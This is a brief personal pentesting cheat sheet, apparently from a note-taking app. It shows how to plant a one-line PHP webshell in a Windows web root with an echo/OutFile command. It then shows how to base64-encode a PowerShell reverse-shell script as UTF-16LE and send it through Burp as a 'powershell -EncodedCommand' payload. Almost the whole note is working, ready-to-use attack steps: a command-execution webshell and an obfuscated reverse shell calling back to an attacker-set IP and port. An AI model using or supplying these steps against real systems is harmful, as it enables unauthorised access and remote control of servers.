write webshell files to webroot.

inet/pub/www or smth
```
echo '<?php system($_REQUEST["cmd"]); ?>' | OutFile -Encoding UTF8 shell.php
```
in windows, convert the php file to UTF8 First
![[Pasted image 20251004153427.png]]
now you can browse to that webshell and intercept in burp,

to get a reverse shell,  copy either rev.ps1 or conpty.ps1 and convert them to base64, convert to UTF16 le
```
nano /tools/rev.ps1
# EDIT IP PORT
cat /tools/rev.ps1 |iconv -t utf-16le | base64 -w 0
```

copy b64, go to burp
then change request to `POST` 
with the data field: DONT FORGET TO URL ENCODE the payload ctrl shift + u
`cmd=powershell -EncodedCommand <base64>`
![[Pasted image 20251004153924.png]]

